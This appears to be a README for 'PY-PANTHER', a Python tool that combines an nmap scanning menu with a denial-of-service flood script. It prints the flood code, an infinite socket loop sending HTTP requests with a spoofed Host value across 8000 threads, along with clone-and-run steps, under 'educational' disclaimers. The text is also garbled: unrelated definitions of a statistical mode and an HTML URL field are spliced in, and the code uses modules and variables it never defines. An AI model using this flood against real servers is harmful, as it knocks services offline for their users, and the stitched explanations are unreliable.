PY-PANTHER
==========

 Performing a DDOS attack onto any server that is not yours or you don’t have permission to attack is highly illegal..
 
 ---
 INTRODUCTION
----------------
 we are going to write a penetration-testing script, namely a DDOS script, in Python. This program will allow us to flood a server with so many reqeusts that, after a while, it won’t be able to respond anymore and it will go down.

But let me give you a big warning here! Performing a DDOS attack onto any server that is not yours or you don’t have permission to attack is highly illegal. I do not recommend the attacks on any servers other than your own and I am not responsible for what you are going to do with this script. This post is purely educational and shall help you to understand networking and programming with Python. So don’t do stupid things!

WHAT IS DDOS?

DDOS stands for Distributed Denial of Service and it is an attack where we block the ressources of a server by flooding it with requests. Usually this kind of attack is never performed alone but with the help of so-called botnets.
![PY-PANTHER](https://www.neuralnine.com/wp-content/uploads/2019/09/botnet2-1024x702.png)

In a botnet, one hacker infects many computers and servers of ordinary people, in order to use them as zombies. He uses them for a collective attack onto a server. Instead of one DDOS script, he can now run thousands of them. Sooner or later the server will be overwhelmed with the amount of requests so that it is not even able to respond to an ordinary user. For smaller and weaker servers, sometimes one attacker is enough to get it down. However, usually such an attack can be counteracted by blocking the IP-addresses of the attackers.

WHAT IS NMAP?
Nmap, short for Network Mapper, is a free, open-source tool for vulnerability scanning and network discovery. Network administrators use Nmap to identify what devices are running on their systems, discovering hosts that are available and the services they offer, finding open ports and detecting security risks.


Implementing The DDOS Script

The implentation of a DDOS script in Python is quite simple. We only need to send requests to a host on a specific port over and over again. This can be done with sockets. To speed the process up and make it more effective, we will use multi-threading as well. So, the following libraries will be needed for this tutorial:

```
import socket
import threading
```
then write the executable code

```
def restart_program() :
    python = sys.executable
    os.execl(python, python, *sys.argv)
    os.system('clear')
```
We all know, what import nmap is for, to import the nmap module to our python script.
Then we initialise the Nmap PortScanner to scan the ports on our local network.
```
scanner = nmap.PortScanner()
```
The type of scan we use in this attacks are:
```
mode = input("""\nEnter the type of scan!!!
                  [1] Domain LookUp
                  [2] Whole Network Scan
                  [3] Simple Network scan
                  [4] Aggressive Scan 
                  [5] CVE Scan
                  [00] Back\nEnter your option : """)
        print("\nYou have selected option: ", mode)
```        

The mode of a set of data values is the value that appears most often. It is the value at which the data is most likely to be sampled.
```
if mode == '1' :
```
The <input type="url"> defines a field for entering a URL.The input value is automatically validated before the form can be submitted.
```
 url = input("Enter the Domain Name : ")
 ```
 
 the if statements used for the conditional execution
 ```
  a = platform.system()
            if a == 'Windows' :
                print(os.system('ipconfig'))
            elif a == 'Linux' :
                print(os.system('ifconfig'))
            elif a == 'Darwin' :
                print(os.system('ifconfig'))
```
Enumerating(counting and listing one by one) all the open ports on You can also provide the IP address of any remote server as well, to scan
```
lport = scanner[ip][proto].keys()
```
As I already mentioned, DDOS is illegal. So be careful witht the target that you choose here. You can also choose your home server, your printer or maybe even your own website. If you don’t know your IP-address, you can use your command line and ping the domain to get it. As a fake IP-address I chose a random but still valid address. Last but not least, I decided to attack the port 80, which is HTTP. If you want to shut down a specific service, you need to know which port it is operating at.
```
  def attack() :
        while True :
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((target, port))
          s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
          s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
```
We created a variable attack_num that tracks how many requests have been sent already. With every iteration, we increase this number and print it.
```
  global attack_num
  attack_num += 1
  print(attack_num)
  
  s.close()
```
In this case, we are starting 8000 threads that will execute our function.
Of course, you can play around with the number.When we now execute our script, we will DDOS the target but we won’t see anything.
If you want to see some information, you may print the amounts of requests already sent.
just notice that this will slow down your attack.
```
    for i in range(8000) :
        thread = threading.Thread(target=attack)
        thread.start()
```
How to use it
-------
 First unload the tool.
```
git clone https://github.com/redteamacademy/ADCDGRP/pypanther.git
cd pypanther
python pypanther.py -h
```
If it does not work, try to install all the libraries that are located in the file **requirements.txt**
```
pip install -r requirements.txt
```

Disclaimer
-------
This tool has been published educational purposes. It is intended to teach people how bad guys could track them, monitor them or obtain information from their credentials, we are not responsible for the use or the scope that someone may have through this project.

We are totally convinced that if we teach how vulnerable things really are, we can make the Internet a safer place.

Developer
-------
ADCD STUDENTS COCHIN & CALICUT

Happy Pentesting!
-------
I invite you, if you use this tool helps to share, collaborate. Let's make the Internet a safer place, let's report.

## License

The content of this project itself is licensed under the [Creative Commons Attribution 3.0 license](http://creativecommons.org/licenses/by/3.0/us/deed.en_US), and the underlying source code used to format and display that content is licensed under the [MIT license](http://opensource.org/licenses/mit-license.php).

Copyright, REDTEAM & STUDENTS
